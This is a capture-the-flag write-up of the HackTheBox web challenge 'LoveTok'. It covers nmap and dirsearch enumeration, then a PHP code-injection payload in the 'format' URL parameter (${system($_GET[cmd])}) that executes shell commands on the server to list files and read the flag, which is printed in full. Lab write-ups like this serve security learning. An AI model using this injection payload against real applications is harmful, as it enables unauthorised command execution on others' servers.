---
title: 'HackTheBox: LoveTok'
disqus: hackmd
---

HackTheBox: LoveTok Writeup
===


## Table of Contents

[TOC]

## Topic

### Lab
#### HackTheBox: 
https://app.hackthebox.com/challenges/198

### Initial Enumeration

●Start Machine: 
http://206.189.28.180:30492/
![](https://hackmd.io/_uploads/H17tqXtb6.png)

## Solution

### 1. Attempt

#### 1.1 nmap scan 
> nmap -sC -sV -T4 206.189.28.180

![](https://hackmd.io/_uploads/rkrNh7K-p.png)
> 這題非滲透，只開 port 30492

#### 1.2 dirsearch scan
> dirsearch -u http://206.189.28.180:30492/

![](https://hackmd.io/_uploads/ryFP6XKWT.png)
> /.DS_Store

●[.DS_Store用途](https://zh.wikipedia.org/zh-tw/.DS_Store)

#### 1.3 Browse
##### 1.3.1 Click on the button, url changes
![](https://hackmd.io/_uploads/S1glgNYW6.png)
> http://206.189.28.180:30492/?format=r
##### 1.3.2 Edit url
> http://206.189.28.180:30492/?format=chw

![](https://hackmd.io/_uploads/B1o8lNtZT.png)

**(Text Changed)**
> 2023-10-16T22:24:07+00:00101

### 2. Web shell
#### 2.1 system() function
●Web Shell: https://www.imperva.com/learn/application-security/web-shell/
●HackTricks: [PHP Code Execution ](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#php-code-execution)

(restart machine, IP 有變更)
> http://142.93.32.153:30198/?format=${system($_GET[cmd])}&cmd=ls

![](https://hackmd.io/_uploads/Hy4H6Aoba.png)

#### 2.2 Check download file
##### 2.2.1 idex.php 位在LoveTok\web_lovetok\challenge
![](https://hackmd.io/_uploads/SyMKT0sZT.png)

##### 2.2.2 Find Flag location
\LoveTok\web_lovetok
![](https://hackmd.io/_uploads/rJHx0Co-p.png)

#### 2.3 Find Flag during Web shell
> TEST : http://142.93.32.153:30198/?format=${phpinfo()} 
> 
> http://142.93.32.153:30198/?format=${system($_GET[cmd])}&cmd=ls+../
(URL encode: 空白='+')

![](https://hackmd.io/_uploads/rJaR1y2ZT.png)

### 3. Find Flag 
> http://142.93.32.153:30198/?format=${system($_GET[cmd])}&cmd=cat+../flagNBD9R

![](https://hackmd.io/_uploads/Byy5xk2-a.png)
> **FLAG: HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}**


###### tags: `Web` `CTF` `Webshell` 
